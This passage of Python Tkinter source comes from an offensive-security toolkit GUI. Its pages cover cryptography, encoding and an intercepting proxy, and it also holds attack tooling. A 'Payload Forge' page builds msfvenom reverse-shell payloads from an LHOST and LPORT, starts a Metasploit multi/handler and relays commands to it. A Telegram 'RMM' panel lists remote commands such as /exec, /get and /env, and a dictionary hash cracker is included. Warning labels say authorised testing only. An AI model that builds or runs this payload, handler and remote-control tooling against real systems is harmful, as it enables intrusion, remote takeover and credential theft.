        res = SecurityEngine.osint_lookup(target)
        self._log_audit(res)
        self._log_op("osint", f"OSINT {target}", res.splitlines()[0])

    def _trigger_sysinfo(self):
        self._log_op("system", "System telemetry", platform.node())
        threading.Thread(target=lambda: self._log_audit(SecurityEngine.get_system_telemetry()), daemon=True).start()

    def _trigger_report(self):
        text = self.audit_log.get("1.0", "end-1c")
        if not text.strip():
            messagebox.showinfo("Report", "Nothing to export yet.")
            return
        path = os.path.join(os.path.expanduser("~"),
                            f"report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        try:
            SecurityEngine.export_html(text, "LOL Tools — Audit Report", path)
            self._log_audit(f"[+] Report saved: {path}")
            self._log_op("report", "Export HTML", path)
            if HAS_REQUESTS is not None:
                try:
                    subprocess.Popen(["xdg-open", path])
                except Exception:
                    pass
        except Exception as e:
            self._log_audit(f"[-] Export failed: {e}")

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: TELEGRAM
    # ═══════════════════════════════════════════════════════════════════
    def _build_telegram_page(self):
        f = self.page_frames["Telegram"]
        panel = self._card(f, "📡 Telegram RMM Gateway")
        tk.Label(panel, text="Bot Token API Key:", bg=BG2, fg=TEXT).grid(row=0, column=0, sticky="w", pady=5)
        self.token_entry = self._entry(panel, 42)
        self.token_entry.grid(row=0, column=1, sticky="w", padx=8, pady=5)
        tk.Label(panel, text="Admin Chat ID:", bg=BG2, fg=TEXT).grid(row=1, column=0, sticky="w", pady=5)
        self.chat_entry = self._entry(panel, 42)
        self.chat_entry.grid(row=1, column=1, sticky="w", padx=8, pady=5)
        r = tk.Frame(panel, bg=BG2)
        r.grid(row=2, column=0, columnspan=2, pady=10)
        self._btn(r, "▶ Initialize Link", self._start_telegram_loop, ACCENT2).pack(side="left", padx=6)
        tk.Label(r, text="Commands: /exec /ls /get /ps /scan /geo /net /env", bg=BG2, fg=TDIM,
                 font=(MONO, 8)).pack(side="left", padx=10)

        self.mgmt_log = scrolledtext.ScrolledText(f, bg=BG, fg=YELLOW, font=(MONO, 10), relief="flat")
        self.mgmt_log.pack(fill="both", expand=True, padx=16, pady=(0, 12))

    def _log_mgmt(self, message):
        self.log_queue.put(("append", "mgmt_log", message))

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: CRYPTO (sub-tabs: Text / Files / Keys)
    # ═══════════════════════════════════════════════════════════════════
    def _build_crypto_page(self):
        f = self.page_frames["Crypto"]
        nb = ttk.Notebook(f)
        nb.pack(fill="both", expand=True, padx=16, pady=12)

        # ── Text cipher tab ──
        t1 = tk.Frame(nb, bg=BG)
        nb.add(t1, text="  Text Cipher  ")
        ctrl = self._card(t1, "🔐 Symmetric / Stream Ciphers")
        tk.Label(ctrl, text="Cipher:", bg=BG2, fg=TEXT).pack(side="left")
        self.cipher_combo = ttk.Combobox(ctrl, values=CIPHERS, state="readonly", width=14)
        self.cipher_combo.current(0)
        self.cipher_combo.pack(side="left", padx=8)
        tk.Label(ctrl, text="Key:", bg=BG2, fg=TEXT).pack(side="left")
        self.crypto_key = self._entry(ctrl, 24, "FEON2026")
        self.crypto_key.pack(side="left", padx=8)
        self._btn(ctrl, "🔒 Encrypt", lambda: self._trigger_crypto(True), PURPLE).pack(side="left", padx=6)
        self._btn(ctrl, "🔓 Decrypt", lambda: self._trigger_crypto(False), ACCENT2).pack(side="left", padx=6)
        self.crypto_box = scrolledtext.ScrolledText(t1, bg=BG2, fg=ACCENT, font=(MONO, 11),
                                                    relief="flat", height=14)
        self.crypto_box.pack(fill="both", expand=True, padx=8, pady=(0, 10))

        # ── File cipher tab ──
        t2 = tk.Frame(nb, bg=BG)
        nb.add(t2, text="  File Cipher  ")
        fc = self._card(t2, "📁 AES-GCM File Encryption")
        tk.Label(fc, text="Source file:", bg=BG2, fg=TEXT).grid(row=0, column=0, sticky="w", pady=5)
        self.fsrc_entry = self._entry(fc, 40)
        self.fsrc_entry.grid(row=0, column=1, sticky="w", padx=8)
        self._btn(fc, "Browse…", lambda: self._file_pick("fsrc"), BG3, TEXT).grid(row=0, column=2, padx=4)
        tk.Label(fc, text="Output file:", bg=BG2, fg=TEXT).grid(row=1, column=0, sticky="w", pady=5)
        self.fdst_entry = self._entry(fc, 40)
        self.fdst_entry.grid(row=1, column=1, sticky="w", padx=8)
        tk.Label(fc, text="Password:", bg=BG2, fg=TEXT).grid(row=2, column=0, sticky="w", pady=5)
        self.fpass_entry = self._entry(fc, 40)
        self.fpass_entry.grid(row=2, column=1, sticky="w", padx=8)
        r = tk.Frame(fc, bg=BG2)
        r.grid(row=3, column=0, columnspan=3, pady=10)
        self._btn(r, "🔒 Encrypt File", self._trigger_file_encrypt, ACCENT).pack(side="left", padx=6)
        self._btn(r, "🔓 Decrypt File", self._trigger_file_decrypt, ACCENT2).pack(side="left", padx=6)
        self.file_status = tk.Label(t2, text="", bg=BG, fg=ACCENT, font=(MONO, 9))
        self.file_status.pack(pady=10)

        # ── Keys tab ──
        t3 = tk.Frame(nb, bg=BG)
        nb.add(t3, text="  RSA / ECDSA  ")
        kbar = self._card(t3, "🔑 Asymmetric Keys (RSA-2048 / ECDSA P-256)")
        self._btn(kbar, "⚙ Generate RSA", lambda: self._gen_keys("RSA"), ACCENT2).pack(side="left", padx=4)
        self._btn(kbar, "⚙ Generate ECDSA", lambda: self._gen_keys("ECDSA"), PURPLE).pack(side="left", padx=4)
        self._btn(kbar, "🔒 Encrypt", lambda: self._keys_action("encrypt")).pack(side="left", padx=4)
        self._btn(kbar, "🔓 Decrypt", lambda: self._keys_action("decrypt")).pack(side="left", padx=4)
        self._btn(kbar, "✍ Sign", lambda: self._keys_action("sign"), YELLOW, BG).pack(side="left", padx=4)
        self._btn(kbar, "✔ Verify", lambda: self._keys_action("verify"), YELLOW, BG).pack(side="left", padx=4)

        body = tk.Frame(t3, bg=BG)
        body.pack(fill="both", expand=True, padx=8, pady=(0, 10))
        left = tk.Frame(body, bg=BG)
        left.pack(side="left", fill="both", expand=True, padx=(0, 6))
        tk.Label(left, text="Data / Message:", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w")
        self.keys_input = scrolledtext.ScrolledText(left, bg=BG2, fg=ACCENT, font=(MONO, 9), height=5, relief="flat")
        self.keys_input.pack(fill="both", expand=True, pady=(2, 6))
        tk.Label(left, text="Output (ciphertext / signature / status):", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w")
        self.keys_output = scrolledtext.ScrolledText(left, bg=BG, fg=YELLOW, font=(MONO, 9), height=7, relief="flat")
        self.keys_output.pack(fill="both", expand=True, pady=(2, 0))
        right = tk.Frame(body, bg=BG, width=360)
        right.pack(side="left", fill="y", padx=(6, 0))
        tk.Label(right, text="Public Key (PEM):", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w")
        self.pub_pem = scrolledtext.ScrolledText(right, bg=BG2, fg=PURPLE, font=(MONO, 8), height=9, relief="flat")
        self.pub_pem.pack(fill="x", pady=(2, 6))
        tk.Label(right, text="Private Key (PEM):", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w")
        self.priv_pem = scrolledtext.ScrolledText(right, bg=BG2, fg=RED, font=(MONO, 8), height=9, relief="flat")
        self.priv_pem.pack(fill="x", pady=(2, 0))

    def _file_pick(self, which):
        path = filedialog.askopenfilename(title="Select file")
        if path:
            getattr(self, f"{which}_entry").delete(0, "end")
            getattr(self, f"{which}_entry").insert(0, path)

    def _trigger_crypto(self, enc_mode):
        raw = self.crypto_box.get("1.0", "end-1c")
        if not raw.strip():
            return
        key = self.crypto_key.get().strip() or "FEON2026"
        cipher = self.cipher_combo.get()
        res = SecurityEngine.process_crypto(raw, key=key, encrypt=enc_mode, cipher=cipher)
        self.crypto_box.delete("1.0", "end")
        self.crypto_box.insert("1.0", res)
        self._log_op("crypto", f"{'Encrypt' if enc_mode else 'Decrypt'} [{cipher}]",
                     f"input {len(raw)} chars")

    def _trigger_file_encrypt(self):
        src = self.fsrc_entry.get().strip()
        dst = self.fdst_entry.get().strip() or src + ".enc"
        pwd = self.fpass_entry.get().strip()
        if not src or not pwd:
            messagebox.showwarning("Warning", "Source file and password required.")
            return
        try:
            threading.Thread(target=lambda: self._file_cipher(src, dst, pwd, True), daemon=True).start()
        except Exception as e:
            self.file_status.configure(text=f"[-] {e}", fg=RED)

    def _trigger_file_decrypt(self):
        src = self.fsrc_entry.get().strip()
        dst = self.fdst_entry.get().strip() or src[:-4] if src.endswith(".enc") else (src + ".dec")
        pwd = self.fpass_entry.get().strip()
        if not src or not pwd:
            messagebox.showwarning("Warning", "Source file and password required.")
            return
        try:
            threading.Thread(target=lambda: self._file_cipher(src, dst, pwd, False), daemon=True).start()
        except Exception as e:
            self.file_status.configure(text=f"[-] {e}", fg=RED)

    def _file_cipher(self, src, dst, pwd, enc):
        try:
            if enc:
                SecurityEngine.encrypt_file(src, dst, pwd)
                msg = f"[+] Encrypted: {dst} ({os.path.getsize(dst)} bytes)"
            else:
                SecurityEngine.decrypt_file(src, dst, pwd)
                msg = f"[+] Decrypted: {dst} ({os.path.getsize(dst)} bytes)"
            self.log_queue.put(("label", "file_status", msg, ACCENT))
            self._log_op("crypto", "File " + ("encrypt" if enc else "decrypt"), dst)
        except Exception as e:
            self.log_queue.put(("label", "file_status", f"[-] {e}", RED))

    def _gen_keys(self, curve):
        if not HAS_CRYPTOGRAPHY:
            messagebox.showerror("Error", "cryptography package required.")
            return
        try:
            priv, pub = SecurityEngine.generate_keypair(curve)
            self.priv_pem.delete("1.0", "end")
            self.priv_pem.insert("1.0", priv)
            self.pub_pem.delete("1.0", "end")
            self.pub_pem.insert("1.0", pub)
            self.keys_output.delete("1.0", "end")
            self.keys_output.insert("1.0", f"[+] {curve} keypair generated (2048-bit RSA / P-256 ECDSA).")
        except Exception as e:
            self.keys_output.delete("1.0", "end")
            self.keys_output.insert("1.0", f"[-] {e}")

    def _keys_action(self, kind):
        data = self.keys_input.get("1.0", "end-1c").strip()
        pub = self.pub_pem.get("1.0", "end-1c").strip()
        priv = self.priv_pem.get("1.0", "end-1c").strip()
        if not data:
            return
        try:
            if kind == "encrypt":
                res = SecurityEngine.rsa_encrypt(data, pub)
                label = "RSA ciphertext"
            elif kind == "decrypt":
                res = SecurityEngine.rsa_decrypt(data, priv)
                label = "RSA plaintext"
            elif kind == "sign":
                res = SecurityEngine.rsa_sign(data, priv)
                label = "RSA signature"
            else:
                ok = SecurityEngine.rsa_verify(data, self.keys_output.get("1.0", "end-1c").strip(), pub) \
                     or SecurityEngine.ecdsa_verify(data, self.keys_output.get("1.0", "end-1c").strip(), pub)
                res = f"[{'✔ VALID' if ok else '✘ INVALID'}] Signature verification"
                label = "verification"
            self.keys_output.delete("1.0", "end")
            self.keys_output.insert("1.0", res)
            self._log_op("crypto", f"Keys [{kind}]", label)
        except Exception as e:
            self.keys_output.delete("1.0", "end")
            self.keys_output.insert("1.0", f"[-] {e}")

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: PAYLOAD FORGE
    # ═══════════════════════════════════════════════════════════════════
    def _build_payload_page(self):
        f = self.page_frames["Payload"]
        panel = self._card(f, "💥 Metasploit Payload Generator — Authorized Testing Only")
        tk.Label(panel, text="LHOST:", bg=BG2, fg=TEXT).grid(row=0, column=0, sticky="w", pady=6)
        self.lhost_entry = self._entry(panel, 22, "192.168.1.100")
        self.lhost_entry.grid(row=0, column=1, pady=6, padx=8)
        tk.Label(panel, text="LPORT:", bg=BG2, fg=TEXT).grid(row=0, column=2, sticky="w", pady=6, padx=(10, 0))
        self.lport_entry = self._entry(panel, 10, "4444")
        self.lport_entry.grid(row=0, column=3, pady=6, padx=8)
        tk.Label(panel, text="Platform:", bg=BG2, fg=TEXT).grid(row=1, column=0, sticky="w", pady=6)
        self.platform_combo = ttk.Combobox(panel, values=list(PAYLOAD_PLATFORMS.keys()),
                                           state="readonly", width=24)
        self.platform_combo.current(0)
        self.platform_combo.grid(row=1, column=1, columnspan=2, pady=6, padx=8, sticky="w")
        self._btn(panel, "⚙ Generate", self._trigger_generate_payload, ACCENT).grid(row=1, column=3, pady=6)
        self._btn(panel, "▶ Start Handler", self._trigger_start_handler, ACCENT2).grid(row=2, column=1, pady=6, sticky="e")
        self._btn(panel, "■ Stop Handler", self._trigger_stop_handler, YELLOW, BG).grid(row=2, column=2, pady=6, sticky="w")

        self.forge_log = scrolledtext.ScrolledText(f, bg=BG, fg=TEXT, insertbackground=ACCENT,
                                                   relief="flat", font=(MONO, 10))
        self.forge_log.pack(fill="both", expand=True, padx=16, pady=(0, 6))
        cmdbar = tk.Frame(f, bg=BG2, padx=10, pady=6)
        cmdbar.pack(fill="x", padx=16, pady=(0, 8))
        tk.Label(cmdbar, text="msfconsole >", bg=BG2, fg=PURPLE, font=(MONO, 10, "bold")).pack(side="left")
        self.forge_cmd = self._entry(cmdbar, 54)
        self.forge_cmd.pack(side="left", padx=8)
        self.forge_cmd.bind("<Return>", lambda e: self._forge_send_command())
        self._btn(cmdbar, "Send", self._forge_send_command).pack(side="left")
        tk.Label(f, text="⚠ For authorized devices you own only — generated payloads are real malware.",
                 bg=BG, fg=YELLOW, font=(MONO, 8)).pack(anchor="w", padx=16, pady=(0, 8))

    def _log_forge(self, message):
        self.log_queue.put(("append", "forge_log", message))

    def _trigger_generate_payload(self):
        lhost = self.lhost_entry.get().strip()
        lport = self.lport_entry.get().strip()
        if not lhost or not lport:
            messagebox.showwarning("Warning", "LHOST and LPORT are required.")
            return
        payload, fmt, ext = PAYLOAD_PLATFORMS[self.platform_combo.get()]
        out_path = os.path.join(os.path.expanduser("~"), f"payload.{ext}")
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", out_path]
        self._log_forge(f"[~] Platform: {self.platform_combo.get()} -> {out_path}")
        self._log_forge("[~] " + " ".join(cmd))
        threading.Thread(target=self._run_forge(cmd, out_path), daemon=True).start()

    def _run_forge(self, cmd, out_path):
        def inner():
            try:
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                msg = (proc.stdout + proc.stderr).strip()
                self._log_forge(f"[+] msfvenom: {msg[:2000]}")
                if proc.returncode == 0 and os.path.isfile(out_path):
                    self._log_forge(f"[+] Payload written: {out_path} ({os.path.getsize(out_path)} bytes)")
                    self._log_op("payload", "Generate", out_path)
                else:
                    self._log_forge(f"[-] Generation failed (exit {proc.returncode}).")
            except Exception as e:
                self._log_forge(f"[-] Error: {e}")
        return inner

    def _trigger_start_handler(self):
        if self.handler_proc and self.handler_proc.poll() is None:
            self._log_forge("[!] Handler already running.")
            return
        lhost = self.lhost_entry.get().strip()
        lport = self.lport_entry.get().strip()
        payload = PAYLOAD_PLATFORMS[self.platform_combo.get()][0]
        x = (f"use exploit/multi/handler; set PAYLOAD {payload}; "
             f"set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j")
        master, slave = pty.openpty()
        self.handler_master = master
        env = {**os.environ, "TERM": "xterm-256color"}
        self.handler_proc = subprocess.Popen(
            ["msfconsole", "-q", "-x", x],
            stdin=slave, stdout=slave, stderr=slave, close_fds=True, env=env)
        os.close(slave)
        self._log_forge(f"[+] Handler started (PID {self.handler_proc.pid}).")
        threading.Thread(target=self._pump_handler_output, daemon=True).start()

    def _pump_handler_output(self):
        ansi = re.compile(r"\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07")
        buf = ""
        try:
            while True:
                data = os.read(self.handler_master, 4096)
                if not data:
                    break
                buf += ansi.sub("", data.decode(errors="replace"))
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    line = line.rstrip("\r")
                    if line.strip():
                        self._log_forge(line)
        except OSError:
            pass
        self._log_forge("[-] Handler process exited.")

    def _forge_send_command(self):
        cmd = self.forge_cmd.get().strip()
        if not cmd:
            return
        self.forge_cmd.delete(0, "end")
        if not self.handler_master:
            self._log_forge("[!] No active handler.")
            return
        try:
            os.write(self.handler_master, (cmd + "\n").encode())
            self._log_forge(f"[send] {cmd}")
        except OSError as e:
            self._log_forge(f"[-] Cannot send: {e}")

    def _trigger_stop_handler(self):
        if self.handler_proc and self.handler_proc.poll() is None:
            self.handler_proc.terminate()
        if self.handler_master:
            try:
                os.close(self.handler_master)
            except OSError:
                pass
            self.handler_master = None
        self._log_forge("[■] Handler terminated.")

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: HASHES
    # ═══════════════════════════════════════════════════════════════════
    def _build_hash_page(self):
        f = self.page_frames["Hashes"]
        top = self._card(f, "🔑 Hash Generator")
        tk.Label(top, text="Plaintext:", bg=BG2, fg=TEXT).pack(side="left")
        self.hash_input = self._entry(top, 42)
        self.hash_input.pack(side="left", padx=8)
        self.hash_algo_combo = ttk.Combobox(top, values=list(HASH_FUNCS.keys()), state="readonly", width=14)
        self.hash_algo_combo.current(3)
        self.hash_algo_combo.pack(side="left", padx=8)
        self._btn(top, "🔨 Hash", self._trigger_hash_btn, ACCENT).pack(side="left", padx=8)

        mid = self._card(f, "🔓 Crack Hash")
        tk.Label(mid, text="Target Hash:", bg=BG2, fg=TEXT).grid(row=0, column=0, sticky="w", pady=5)
        self.crack_target = self._entry(mid, 44)
        self.crack_target.grid(row=0, column=1, sticky="w", padx=8)
        tk.Label(mid, text="Wordlist:", bg=BG2, fg=TEXT).grid(row=1, column=0, sticky="w", pady=5)
        self.crack_wordlist = self._entry(mid, 44, "/usr/share/wordlists/rockyou.txt")
        self.crack_wordlist.grid(row=1, column=1, sticky="w", padx=8)
        self.crack_algo_combo = ttk.Combobox(mid, values=["Auto-Detect"] + list(CRACK_FUNCS.keys()),
                                             state="readonly", width=14)
        self.crack_algo_combo.current(0)
        self.crack_algo_combo.grid(row=1, column=2, padx=8)
        self._btn(mid, "🔓 Crack", self._trigger_crack, YELLOW, BG).grid(row=0, column=2, rowspan=2, padx=8)

        self.hash_log = scrolledtext.ScrolledText(f, bg=BG, fg=TEXT, insertbackground=ACCENT,
                                                  relief="flat", font=(MONO, 10))
        self.hash_log.pack(fill="both", expand=True, padx=16, pady=(0, 12))

    def _log_hash(self, message):
        self.log_queue.put(("append", "hash_log", message))

    def _trigger_hash_btn(self):
        text = self.hash_input.get().strip()
        algo = self.hash_algo_combo.get()
        if not text:
            return
        res = SecurityEngine.hash_text(text, algo)
        self.hash_log.insert("end", f"[~] {algo}: {res}\n")
        self.hash_log.see("end")
        self._log_op("hash", f"Hash [{algo}]", res[:60])

    def _trigger_crack(self):
        target = self.crack_target.get().strip()
        wordlist = self.crack_wordlist.get().strip()
        if not target or not wordlist:
            messagebox.showwarning("Warning", "Target hash and wordlist are required.")
            return
        if not os.path.isfile(wordlist):
            messagebox.showwarning("Warning", f"Wordlist not found: {wordlist}")
            return
        algo = self.crack_algo_combo.get()
        if algo == "Auto-Detect":
            algo = SecurityEngine.identify_hash(target)
        self.hash_log.insert("end", f"[~] Detected: {algo} | Target: {target}\n")
        self.hash_log.insert("end", f"[~] Wordlist: {wordlist}\n[~] Cracking started...\n")
        self._log_op("crack", f"Crack [{algo}]", target[:40])
        threading.Thread(target=lambda: self._log_hash(
            SecurityEngine.crack_hash(target, algo, wordlist, self._log_hash)), daemon=True).start()

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: DECODER
    # ═══════════════════════════════════════════════════════════════════
    def _build_decoder_page(self):
        f = self.page_frames["Decoder"]
        self.decode_in = scrolledtext.ScrolledText(f, bg=BG2, fg=ACCENT, font=(MONO, 10),
                                                   height=8, relief="flat")
        self.decode_in.pack(fill="x", padx=16, pady=(12, 4))
        tk.Label(f, text="Input above — Output below:", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w", padx=18)
        btns = tk.Frame(f, bg=BG)
        btns.pack(fill="x", padx=16, pady=6)
        actions = ["Base64 Encode", "Base64 Decode", "Base32 Encode", "Base32 Decode",
                   "URL Encode", "URL Decode", "Hex Encode", "Hex Decode",
                   "HTML Encode", "HTML Decode", "ROT13", "Morse Encode", "Morse Decode",
                   "Gzip Compress", "Gzip Decompress", "Unicode Escape", "Unicode Unescape",
                   "Reverse", "Uppercase", "Lowercase", "Binary Encode", "Binary Decode"]
        for i, a in enumerate(actions):
            self._btn(btns, a, lambda act=a: self._trigger_decode(act), BG3, TEXT).grid(
                row=i // 4, column=i % 4, padx=3, pady=3, sticky="ew")
            btns.grid_columnconfigure(i % 4, weight=1)
        self.decode_out = scrolledtext.ScrolledText(f, bg=BG, fg=YELLOW, font=(MONO, 10),
                                                    height=10, relief="flat")
        self.decode_out.pack(fill="both", expand=True, padx=16, pady=(4, 12))

    def _trigger_decode(self, action):
        raw = self.decode_in.get("1.0", "end-1c")
        res = SecurityEngine.decode_transform(raw, action)
        self.decode_out.delete("1.0", "end")
        self.decode_out.insert("1.0", res)
        self._log_op("decode", action, f"{len(raw)} chars")

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: HTTP PROXY
    # ═══════════════════════════════════════════════════════════════════
    def _build_proxy_page(self):
        f = self.page_frames["Proxy"]
        bar = self._card(f, "🌐 HTTP Intercepting Proxy (Burp-Style)")
        tk.Label(bar, text="Listen Port:", bg=BG2, fg=TEXT).pack(side="left")
        self.proxy_port = self._entry(bar, 8, "8080")
        self.proxy_port.pack(side="left", padx=6)
        tk.Label(bar, text="Find:", bg=BG2, fg=TEXT).pack(side="left", padx=(12, 4))
        self.proxy_find = self._entry(bar, 18)
        self.proxy_find.pack(side="left", padx=4)
        tk.Label(bar, text="Replace:", bg=BG2, fg=TEXT).pack(side="left", padx=(8, 4))
        self.proxy_replace = self._entry(bar, 18)
        self.proxy_replace.pack(side="left", padx=4)
        self._btn(bar, "▶ Start", self._proxy_start, ACCENT).pack(side="left", padx=6)
        self._btn(bar, "■ Stop", self._proxy_stop, YELLOW, BG).pack(side="left", padx=4)
        self._btn(bar, "🧹 Clear", self._proxy_clear, BG3, TEXT).pack(side="left", padx=4)
        self.proxy_status = tk.Label(bar, text="● Offline", bg=BG2, fg=TDIM, font=(MONO, 9))
        self.proxy_status.pack(side="right", padx=8)

        cols = ("time", "method", "host", "path", "status", "size")
        self.proxy_tree = ttk.Treeview(f, columns=cols, show="headings", height=8)
        for c in cols:
            self.proxy_tree.heading(c, text=c.upper())
            self.proxy_tree.column(c, width=90 if c in ("time", "status") else 60, anchor="w")
        self.proxy_tree.column("method", width=70)
        self.proxy_tree.column("host", width=160)
        self.proxy_tree.column("path", width=320)
        self.proxy_tree.column("size", width=70)
        self.proxy_tree.pack(fill="x", padx=16, pady=(0, 6))
        self.proxy_tree.bind("<<TreeviewSelect>>", self._proxy_show_detail)
        self.proxy_detail = scrolledtext.ScrolledText(f, bg=BG3, fg=YELLOW, font=(MONO, 9),
                                                      relief="flat")
        self.proxy_detail.pack(fill="both", expand=True, padx=16, pady=(0, 12))

    def _log_proxy(self, message):
        self.log_queue.put(("append", "proxy_detail", message))

    def _proxy_start(self):
        if self.proxy_server:
            return
        try:
            port = int(self.proxy_port.get().strip() or 8080)
            ProxyHandler.history_callback = self._proxy_on_request
            ProxyHandler.rewrite_find = self.proxy_find.get().strip() or None
            ProxyHandler.rewrite_replace = self.proxy_replace.get()
            self.proxy_server = ThreadingProxyServer(("0.0.0.0", port), ProxyHandler)
        except Exception as e:
            messagebox.showerror("Error", f"Cannot bind proxy: {e}")
            self.proxy_server = None
            return
        self.proxy_status.configure(text=f"● Listening :{port}", fg=ACCENT)
        self._log_proxy(f"[+] Proxy listening on 0.0.0.0:{port}"
                        + (f" | rewrite '{ProxyHandler.rewrite_find}' → '{ProxyHandler.rewrite_replace}'"
                           if ProxyHandler.rewrite_find else ""))
        self._log_op("proxy", "Start", str(port))
        threading.Thread(target=self.proxy_server.serve_forever, daemon=True).start()

    def _proxy_stop(self):
        if self.proxy_server:
            self.proxy_server.shutdown()
            self.proxy_server.server_close()
            self.proxy_server = None
            ProxyHandler.history_callback = None
            ProxyHandler.rewrite_find = None
        self.proxy_status.configure(text="● Offline", fg=TDIM)
        self._log_proxy("[■] Proxy stopped.")

    def _proxy_clear(self):
        self.proxy_entries = []
        for i in self.proxy_tree.get_children():
            self.proxy_tree.delete(i)
        self.proxy_detail.delete("1.0", "end")

    def _proxy_on_request(self, method, host, path, status, size, req_head, resp_head, resp_body):
        entry = {"time": datetime.datetime.now().strftime("%H:%M:%S"), "method": method, "host": host,
                 "path": path[:120], "status": status, "size": size, "req": req_head, "resp": resp_head,
                 "body": resp_body}
        self.proxy_entries.append(entry)
        self.log_queue.put(("proxy_row", entry))

    def _proxy_insert_row(self, entry):
        self.proxy_tree.insert("", "end", values=(
            entry["time"], entry["method"], entry["host"], entry["path"], entry["status"], entry["size"]))
        if len(self.proxy_tree.get_children()) > 500:
            self.proxy_tree.delete(self.proxy_tree.get_children()[0])

    def _proxy_show_detail(self, _event=None):
        sel = self.proxy_tree.selection()
        if not sel:
            return
        idx = self.proxy_tree.index(sel[0])
        if idx >= len(self.proxy_entries):
            return
        e = self.proxy_entries[idx]
        detail = f"── REQUEST ───────────────────────────────\n{e['req']}\n── RESPONSE ──────────────────────────────\n{e['resp']}\n"
        if e["body"]:
            detail += f"── BODY ──────────────────────────────────\n{e['body'][:3000]}\n"
        self.proxy_detail.delete("1.0", "end")
        self.proxy_detail.insert("1.0", detail)

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: REPEATER
    # ═══════════════════════════════════════════════════════════════════
    def _build_repeater_page(self):
        f = self.page_frames["Repeater"]
        req = self._card(f, "🔁 Request Repeater")
        self.rep_method = ttk.Combobox(req, values=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"],
                                       state="readonly", width=9)
        self.rep_method.current(0)
        self.rep_method.pack(side="left")
        self.rep_url = self._entry(req, 52, "http://example.com")
        self.rep_url.pack(side="left", padx=8)
        self._btn(req, "▶ Send", self._repeater_send, ACCENT).pack(side="left", padx=8)

        tk.Label(f, text="Headers (key: value each line):", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w", padx=18)
        self.rep_headers = scrolledtext.ScrolledText(f, bg=BG2, fg=ACCENT, font=(MONO, 9), height=4, relief="flat")
        self.rep_headers.pack(fill="x", padx=16, pady=3)
        tk.Label(f, text="Body:", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w", padx=18)
        self.rep_body = scrolledtext.ScrolledText(f, bg=BG2, fg=ACCENT, font=(MONO, 9), height=4, relief="flat")
        self.rep_body.pack(fill="x", padx=16, pady=3)
        self.rep_response = scrolledtext.ScrolledText(f, bg=BG, fg=YELLOW, font=(MONO, 9), relief="flat")
        self.rep_response.pack(fill="both", expand=True, padx=16, pady=(4, 12))

    def _repeater_send(self):
        method = self.rep_method.get()
        url = self.rep_url.get().strip()
        if not url.startswith("http"):
            url = "http://" + url
        headers = {}
        for line in self.rep_headers.get("1.0", "end-1c").splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()
        body = self.rep_body.get("1.0", "end-1c")
        self._log_op("repeater", f"{method} {url}", "")
        threading.Thread(target=lambda: self._repeater_worker(method, url, headers, body), daemon=True).start()

    def _repeater_worker(self, method, url, headers, body):
        try:
            if HAS_REQUESTS:
                resp = requests.request(method, url, headers=headers,
                                        data=body if method != "GET" else None, timeout=20)
                out = f"{resp.status_code} {resp.reason}\n{resp.headers}\n\n{resp.text[:4000]}"
            else:
                from urllib.request import Request, urlopen
                req = Request(url, data=body.encode() if body else None, headers=headers, method=method)
                with urlopen(req, timeout=20) as r:
                    out = f"{r.status}\n{r.headers}\n\n{r.read().decode(errors='replace')[:4000]}"
        except Exception as e:
            out = f"[-] Error: {e}"
        self.log_queue.put(("set", "rep_response", out))

    def _repeater_show(self, text):
        self.rep_response.delete("1.0", "end")
        self.rep_response.insert("1.0", text)

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: BROWSER
    # ═══════════════════════════════════════════════════════════════════
    def _build_browser_page(self):
        f = self.page_frames["Browser"]
        bar = self._card(f, "🌍 QtWebEngine Secure Browser")
        self.browser_url = self._entry(bar, 46, "https://www.google.com")
        self.browser_url.pack(side="left")
        self._btn(bar, "🌐 Open", self._browser_open, ACCENT).pack(side="left", padx=6)
        self._btn(bar, "■ Close", self._browser_close, YELLOW, BG).pack(side="left", padx=4)
        tk.Label(bar, text="(routes via proxy if running)", bg=BG2, fg=TDIM, font=(MONO, 8)).pack(side="left", padx=10)
        tk.Label(f, text="Visited URLs:", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w", padx=18)
        self.browser_history = scrolledtext.ScrolledText(f, bg=BG, fg=TEXT, font=(MONO, 10), relief="flat")
        self.browser_history.pack(fill="both", expand=True, padx=16, pady=(2, 12))
        self._browser_load_history()

    def _browser_load_history(self):
        self.browser_history.delete("1.0", "end")
        try:
            with open(self.browser_log_file) as f:
                lines = f.readlines()
            for ln in lines[-200:]:
                try:
                    e = json.loads(ln)
                    self.browser_history.insert("end", f"{e['time']}  {e['url']}\n")
                except Exception:
                    pass
        except Exception:
            pass

    def _browser_open(self):
        if self.browser_proc and self.browser_proc.poll() is None:
            messagebox.showinfo("Browser", "Browser already running.")
            return
        url = self.browser_url.get().strip()
        proxy = ""
        if self.proxy_server:
            proxy = f"127.0.0.1:{int(self.proxy_port.get().strip() or 8080)}"
        script_path = os.path.join(os.path.expanduser("~"), ".tools1_browser.py")
        with open(script_path, "w") as f:
            f.write(BROWSER_SCRIPT)
        self.browser_proc = subprocess.Popen(
            [sys.executable, script_path, self.browser_log_file, proxy],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            env={**os.environ, "TOOLS1_PROXY": proxy})
        self._log_proxy(f"[+] Browser launched" + (f" routing via proxy {proxy}" if proxy else ""))
